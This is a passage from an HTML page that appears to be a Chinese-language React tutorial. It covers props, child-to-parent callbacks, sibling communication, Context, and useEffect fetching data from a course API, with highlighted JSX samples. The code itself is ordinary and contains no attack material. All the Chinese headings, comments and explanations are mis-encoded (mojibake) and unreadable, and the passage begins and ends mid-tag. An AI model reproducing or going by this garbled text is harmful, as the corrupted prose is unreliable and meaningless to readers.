å­"></a>11.2.1 çˆ¶ä¼ å­</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-17%2017.42.14.png" style="zoom:50%;"><p>å®ç°æ­¥éª¤ï¼š</p><ol><li>çˆ¶ç»„ä»¶ä¼ é€’æ•°æ® â€”â€” åœ¨å­ç»„ä»¶æ ‡ç­¾ä¸Šç»‘å®šå±æ€§ã€‚</li><li>å­ç»„ä»¶æ¥æ”¶æ•°æ® â€”â€” å­ç»„ä»¶é€šè¿‡propså‚æ•°æ¥æ”¶æ•°æ®ã€‚</li></ol><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// çˆ¶ä¼ å­</span><span class="token comment">// 1. çˆ¶ç»„ä»¶ä¼ é€’æ•°æ®  å­ç»„ä»¶æ ‡ç­¾èº«ä¸Šç»‘å®šå±æ€§</span><span class="token comment">// 2. å­ç»„ä»¶æ¥æ”¶æ•°æ®  propsçš„å‚æ•°</span><span class="token keyword">function</span> <span class="token function">Son</span> <span class="token punctuation">(</span><span class="token parameter">props</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// propsï¼šå¯¹è±¡é‡Œé¢åŒ…å«äº†çˆ¶ç»„ä»¶ä¼ é€’è¿‡æ¥çš„æ‰€æœ‰çš„æ•°æ®</span>  <span class="token comment">// { name:'çˆ¶ç»„ä»¶ä¸­çš„æ•°æ®'}</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is son, </span><span class="token punctuation">{</span>props<span class="token punctuation">.</span>name<span class="token punctuation">}</span><span class="token plain-text">, jsx: </span><span class="token punctuation">{</span>props<span class="token punctuation">.</span>child<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> name <span class="token operator">=</span> <span class="token string">'this is app name'</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Son</span></span>        <span class="token attr-name">name</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span>        <span class="token attr-name">age</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token number">18</span><span class="token punctuation">}</span></span>        <span class="token attr-name">isTrue</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token boolean">false</span><span class="token punctuation">}</span></span>        <span class="token attr-name">list</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">[</span><span class="token string">'vue'</span><span class="token punctuation">,</span> <span class="token string">'react'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>        <span class="token attr-name">obj</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'jack'</span> <span class="token punctuation">}</span><span class="token punctuation">}</span></span>        <span class="token attr-name">cb</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span>        <span class="token attr-name">child</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is span</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">}</span></span>      <span class="token punctuation">/&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>propsè¯´æ˜</li></ul><ol><li>propså¯ä¼ é€’ä»»æ„çš„æ•°æ®</li></ol><p>â€‹æ•°å­—ã€å­—ç¬¦ä¸²ã€å¸ƒå°”å€¼ã€æ•°ç»„ã€å¯¹è±¡ã€å‡½æ•°ã€JSX</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-17%2017.56.22.png" style="zoom:50%;"><ol start="2"><li><p>propsæ˜¯åªè¯»å¯¹è±¡</p><p>å­ç»„ä»¶åªèƒ½è¯»å–propsä¸­çš„æ•°æ®ï¼Œä¸èƒ½ç›´æ¥è¿›è¡Œä¿®æ”¹, çˆ¶ç»„ä»¶çš„æ•°æ®åªèƒ½ç”±çˆ¶ç»„ä»¶ä¿®æ”¹</p></li><li><p>ç‰¹æ®Šçš„prop children</p></li></ol><p>â€‹åœºæ™¯ï¼šå½“æˆ‘ä»¬æŠŠå†…å®¹åµŒå¥—åœ¨å­ç»„ä»¶æ ‡ç­¾ä¸­æ—¶ï¼Œçˆ¶ç»„ä»¶ä¼šè‡ªåŠ¨åœ¨åä¸ºchildrençš„propå±æ€§ä¸­æ¥æ”¶è¯¥å†…å®¹.</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-17%2018.08.02.png" style="zoom:50%;"><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-17%2018.08.18.png" alt="æˆªå±2024-12-17 18.08.18" style="zoom:50%;"><h2 id="11-3-å­ä¼ çˆ¶"><a href="#11-3-å­ä¼ çˆ¶" class="headerlink" title="11.3 å­ä¼ çˆ¶"></a>11.3 å­ä¼ çˆ¶</h2><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-18%2017.59.10.png" style="zoom:50%;"><p>æ ¸å¿ƒæ€è·¯ï¼šåœ¨å­ç»„ä»¶ä¸­è°ƒç”¨çˆ¶ç»„ä»¶ä¸­çš„å‡½æ•°å¹¶ä¼ é€’å‚æ•°ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-18%2017.59.37.png" style="zoom:40%;"><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// æ ¸å¿ƒï¼šåœ¨å­ç»„ä»¶ä¸­è°ƒç”¨çˆ¶ç»„ä»¶ä¸­çš„å‡½æ•°å¹¶ä¼ é€’å®å‚</span><span class="token keyword">import</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token keyword">function</span> <span class="token function">Son</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> onGetSonMsg <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// Sonç»„ä»¶ä¸­çš„æ•°æ®</span>  <span class="token keyword">const</span> sonMsg <span class="token operator">=</span> <span class="token string">'this is son msg'</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is Son      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">onGetSonMsg</span><span class="token punctuation">(</span>sonMsg<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">sendMsg</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>msg<span class="token punctuation">,</span> setMsg<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> <span class="token function-variable function">getMsg</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">msg</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>    <span class="token function">setMsg</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is App, </span><span class="token punctuation">{</span>msg<span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Son</span></span> <span class="token attr-name">onGetSonMsg</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>getMsg<span class="token punctuation">}</span></span> <span class="token punctuation">/&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="11-4-å…„å¼Ÿç»„ä»¶é€šä¿¡"><a href="#11-4-å…„å¼Ÿç»„ä»¶é€šä¿¡" class="headerlink" title="11.4 å…„å¼Ÿç»„ä»¶é€šä¿¡"></a>11.4 å…„å¼Ÿç»„ä»¶é€šä¿¡</h2><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-23%2017.43.25.png" style="zoom:50%;"><p>å®ç°æ€è·¯ï¼šå€ŸåŠ©â€œçŠ¶æ€æå‡â€æœºåˆ¶ï¼Œé€šè¿‡çˆ¶ç»„ä»¶è¿›è¡Œå…„å¼Ÿç»„ä»¶ä¹‹é—´çš„æ•°æ®ä¼ é€’</p><ol><li>Aç»„ä»¶å…ˆé€šè¿‡å­ä¼ çˆ¶çš„æ–¹å¼æŠŠæ•°æ®ä¼ ç»™çˆ¶ç»„ä»¶App</li><li>Appæ‹¿åˆ°æ•°æ®åé€šè¿‡çˆ¶ä¼ å­çš„æ–¹å¼å†ä¼ é€’ç»™Bç»„ä»¶</li></ol><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// 1. é€šè¿‡å­ä¼ çˆ¶ A -&gt; App</span><span class="token comment">// 2. é€šè¿‡çˆ¶ä¼ å­ App -&gt; B</span><span class="token keyword">import</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token keyword">function</span> <span class="token constant">A</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> onGetAName <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// Sonç»„ä»¶ä¸­çš„æ•°æ®</span>  <span class="token keyword">const</span> name <span class="token operator">=</span> <span class="token string">'this is A name'</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is A compnent,      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">onGetAName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">send</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token constant">B</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> name <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is B compnent,      </span><span class="token punctuation">{</span>name<span class="token punctuation">}</span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>name<span class="token punctuation">,</span> setName<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> <span class="token function-variable function">getAName</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    <span class="token function">setName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is App      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">A</span></span> <span class="token attr-name">onGetAName</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>getAName<span class="token punctuation">}</span></span> <span class="token punctuation">/&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">B</span></span> <span class="token attr-name">name</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span> <span class="token punctuation">/&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="11-5-è·¨å±‚çº§ç»„ä»¶é€šä¿¡"><a href="#11-5-è·¨å±‚çº§ç»„ä»¶é€šä¿¡" class="headerlink" title="11.5 è·¨å±‚çº§ç»„ä»¶é€šä¿¡"></a>11.5 è·¨å±‚çº§ç»„ä»¶é€šä¿¡</h2><p>ä½¿ç”¨Contextæœºåˆ¶è·¨å±‚çº§ç»„ä»¶é€šä¿¡ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-23%2017.52.00.png" style="zoom:50%;"><p>å®ç°æ­¥éª¤ï¼š</p><ol><li>ä½¿ç”¨createContextæ–¹æ³•åˆ›å»ºä¸€ä¸ªä¸Šä¸‹æ–‡å¯¹è±¡Ctxã€‚</li><li>åœ¨é¡¶å±‚ç»„ä»¶ï¼ˆAppï¼‰ä¸­é€šè¿‡ Ctx.Provider ç»„ä»¶æä¾›æ•°æ®ã€‚</li><li>åœ¨åº•å±‚ç»„ä»¶ï¼ˆBï¼‰ä¸­é€šè¿‡ useContext é’©å­å‡½æ•°è·å–æ¶ˆè´¹æ•°æ®ã€‚</li></ol><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// App -&gt; A -&gt; B</span><span class="token keyword">import</span> <span class="token punctuation">{</span> createContext<span class="token punctuation">,</span> useContext <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token comment">// 1. createContextæ–¹æ³•åˆ›å»ºä¸€ä¸ªä¸Šä¸‹æ–‡å¯¹è±¡</span><span class="token keyword">const</span> MsgContext <span class="token operator">=</span> <span class="token function">createContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// 2. åœ¨é¡¶å±‚ç»„ä»¶ é€šè¿‡Providerç»„ä»¶æä¾›æ•°æ®</span><span class="token comment">// 3. åœ¨åº•å±‚ç»„ä»¶ é€šè¿‡useContexté’©å­å‡½æ•°ä½¿ç”¨æ•°æ®</span><span class="token keyword">function</span> <span class="token constant">A</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is A component      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">B</span></span> <span class="token punctuation">/&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token constant">B</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> msg <span class="token operator">=</span> <span class="token function">useContext</span><span class="token punctuation">(</span>MsgContext<span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is B compnent,</span><span class="token punctuation">{</span>msg<span class="token punctuation">}</span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> msg <span class="token operator">=</span> <span class="token string">'this is app msg'</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">MsgContext.Provider</span></span> <span class="token attr-name">value</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>msg<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        this is App        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">A</span></span> <span class="token punctuation">/&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">MsgContext.Provider</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åªè¦å­˜åœ¨é¡¶å±‚å’Œåº•å±‚çš„å…³ç³»éƒ½å¯ä»¥ä½¿ç”¨Contextæ¥è¿›è¡Œé€šä¿¡ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-23%2017.53.00.png" style="zoom:50%;"><h1 id="åäºŒã€useEffect"><a href="#åäºŒã€useEffect" class="headerlink" title="åäºŒã€useEffect"></a>åäºŒã€useEffect</h1><h2 id="12-1-useEffect-çš„æ¦‚å¿µç†è§£"><a href="#12-1-useEffect-çš„æ¦‚å¿µç†è§£" class="headerlink" title="12.1 useEffect çš„æ¦‚å¿µç†è§£"></a>12.1 useEffect çš„æ¦‚å¿µç†è§£</h2><p>useEffectæ˜¯ä¸€ä¸ªReact Hookå‡½æ•°ï¼Œç”¨äºåœ¨Reactç»„ä»¶ä¸­åˆ›å»ºä¸æ˜¯ç”±äº‹ä»¶å¼•èµ·è€Œæ˜¯ç”±æ¸²æŸ“æœ¬èº«å¼•èµ·çš„æ“ä½œï¼ˆå‰¯ä½œç”¨ï¼‰, æ¯”å¦‚å‘é€AJAXè¯·æ±‚ï¼Œæ›´æ”¹DOMç­‰ç­‰ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-27%2015.50.30.png" style="zoom:50%;"><p>è¯´æ˜ï¼šä¸Šé¢çš„ç»„ä»¶ä¸­æ²¡æœ‰å‘ç”Ÿä»»ä½•çš„ç”¨æˆ·äº‹ä»¶ï¼Œç»„ä»¶æ¸²æŸ“å®Œæ¯•ä¹‹åå°±éœ€è¦å’ŒæœåŠ¡å™¨è¦æ•°æ®ï¼Œæ•´ä¸ªè¿‡ç¨‹å±äºâ€œåªç”±æ¸²æŸ“å¼•èµ·çš„æ“ä½œâ€ã€‚</p><h2 id="12-2-useEffect-çš„åŸºç¡€ä½¿ç”¨"><a href="#12-2-useEffect-çš„åŸºç¡€ä½¿ç”¨" class="headerlink" title="12.2 useEffect çš„åŸºç¡€ä½¿ç”¨"></a>12.2 useEffect çš„åŸºç¡€ä½¿ç”¨</h2><p>éœ€æ±‚ï¼šåœ¨ç»„ä»¶æ¸²æŸ“å®Œæ¯•ä¹‹åï¼Œç«‹åˆ»ä»æœåŠ¡ç«¯è·å–é¢‘é“åˆ—è¡¨æ•°æ®å¹¶æ˜¾ç¤ºåˆ°é¡µé¢ä¸­ã€‚</p><p>è¯­æ³•ï¼š</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-27%2015.51.20.png" style="zoom:50%;"><p>å‚æ•°1æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå¯ä»¥æŠŠå®ƒå«åšå‰¯ä½œç”¨å‡½æ•°ï¼Œåœ¨å‡½æ•°å†…éƒ¨å¯ä»¥æ”¾ç½®è¦æ‰§è¡Œçš„æ“ä½œã€‚</p><p>å‚æ•°2æ˜¯ä¸€ä¸ªæ•°ç»„ï¼ˆå¯é€‰å‚ï¼‰ï¼Œåœ¨æ•°ç»„é‡Œæ”¾ç½®ä¾èµ–é¡¹ï¼Œä¸åŒä¾èµ–é¡¹ä¼šå½±å“ç¬¬ä¸€ä¸ªå‚æ•°å‡½æ•°çš„æ‰§è¡Œï¼Œå½“æ˜¯ä¸€ä¸ªç©ºæ•°ç»„çš„æ—¶å€™ï¼Œå‰¯ä½œç”¨å‡½æ•°åªä¼šåœ¨ç»„ä»¶æ¸²æŸ“å®Œæ¯•ä¹‹åæ‰§è¡Œä¸€æ¬¡ã€‚</p><p>æ¥å£åœ°å€ï¼š<a href="http://geek.itheima.net/v1_0/channels">http://geek.itheima.net/v1_0/channels</a></p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> useEffect<span class="token punctuation">,</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token keyword">const</span> <span class="token constant">URL</span> <span class="token operator">=</span> <span class="token string">'http://geek.itheima.net/v1_0/channels'</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// åˆ›å»ºä¸€ä¸ªçŠ¶æ€æ•°æ®</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>list<span class="token punctuation">,</span> setList<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token comment">// é¢å¤–çš„æ“ä½œ è·å–é¢‘é“åˆ—è¡¨</span>    <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getList</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token constant">URL</span><span class="token punctuation">)</span>      <span class="token keyword">const</span> jsonRes <span class="token operator">=</span> <span class="token keyword">await</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>jsonRes<span class="token punctuation">)</span>      <span class="token function">setList</span><span class="token punctuation">(</span>jsonRes<span class="token punctuation">.</span>data<span class="token punctuation">.</span>channels<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token function">getList</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is app      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        </span><span class="token punctuation">{</span>list<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=&gt;</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">key</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>item<span class="token punctuation">.</span>id<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token punctuation">{</span>item<span class="token punctuation">.</span>name<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="12-3-useEffect-ä¾èµ–é¡¹å‚æ•°è¯´æ˜"><a href="#12-3-useEffect-ä¾èµ–é¡¹å‚æ•°è¯´æ˜" class="headerlink" 